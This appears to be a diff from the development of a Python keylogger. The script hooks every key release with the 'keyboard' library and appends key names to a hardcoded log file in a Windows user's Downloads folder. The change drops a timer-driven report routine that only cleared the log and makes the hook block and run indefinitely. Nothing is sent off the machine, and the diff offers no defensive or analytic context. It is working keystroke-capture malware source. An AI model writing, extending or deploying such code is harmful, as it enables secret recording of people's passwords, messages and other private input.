@@ -1,6 +1,5 @@
 import keyboard
 import os
-from threading import Timer
 
 LOG_FILE = "C:/Users/nikilite/Downloads/lol.txt"  # specify the full path to the log file
 
@@ -25,27 +24,12 @@ class Keylogger:
         with open(self.log_file, "a", encoding="utf-8") as file:
             file.write(name)
 
-    def report(self):
-        try:
-            with open(self.log_file, "r", encoding="utf-8", errors="ignore") as file:
-                log = file.read()
-        except FileNotFoundError:
-            log = ""
-        
-        if log:
-            with open(self.log_file, "w", encoding="utf-8") as file:
-                file.write("")
-                
-        self.timer = Timer(interval=99999, function=self.report)
-        self.timer.start()
-
     def start(self):
         keyboard.on_release(callback=self.callback)
-        self.report()
+        keyboard.wait()
 
     def stop(self):
-        if self.timer:
-            self.timer.cancel()
+        keyboard.unhook_all()
 
 if __name__ == "__main__":
     keylogger = Keylogger(log_file=LOG_FILE)
